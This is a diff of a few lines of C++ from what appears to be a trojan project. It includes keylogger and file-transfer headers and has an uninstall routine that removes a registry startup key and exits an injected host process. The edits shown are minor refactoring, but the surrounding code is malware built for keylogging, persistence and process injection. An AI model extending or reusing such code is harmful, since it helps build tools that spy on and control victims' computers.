@@ -2,7 +2,6 @@
 #include <system/System.hpp>
 #include <system/Registry.hpp>
 #include <system/Process.hpp>
-#include <system/ProcessManager.hpp>
 #include <blaspheme/Blaspheme.hpp>
 #include <blaspheme/transfer/FileTransfer.hpp>
 #include <malicious/Keylogger.hpp>
@@ -81,7 +80,7 @@ namespace Inhibition
 		// TODO : exit ne tue pas le processus hote si celui ci a été démarré par COM
         // cet appel va fermer le le processus injecté et décharger la DLL
         // std::exit(0);
-		
+		ExitProcess(0);
 
         return true;
     }
@@ -154,7 +153,7 @@ namespace Inhibition
         LOG << "Removing registry key";
         startup->uninstall();
         LOG << "Launching uninstaller";
-        Process uninstaller(getInstallPath(), UNINSTALL_CMD);		
+        System::Process::Launcher uninstaller(getInstallPath(), UNINSTALL_CMD);		
         exit();
         return true;
     }
